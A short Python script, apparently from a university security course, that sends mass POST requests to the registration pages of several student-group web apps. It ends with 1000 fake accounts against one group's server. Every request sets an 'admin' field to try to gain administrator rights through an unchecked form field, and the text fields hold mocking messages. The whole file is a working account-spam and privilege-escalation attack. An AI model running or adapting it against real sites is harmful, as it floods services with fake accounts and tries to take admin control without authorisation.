import requests


def spam(grp=None, a=10, b=44, logResponse=True, nr=10):
    if grp:
        a, b = grp, grp

    for i in range(a, b+1):
        url = "https://grp{0}.ttm4135.item.ntnu.no:90{0}/register".format(i)

        for x in range(1, nr+1):
            r = requests.post(url=url, data={
                'username': 'hehehe{}'.format(x),
                'password': 'U need to hash th1s',
                'password2': 'U need to hash th1s',
                'email': 'script{}@spam.no'.format(x),
                'admin': 'checked',
                'bio': 'I suck at this',
            })
        if logResponse:
            print(r)

spam(grp=43, nr=1000)
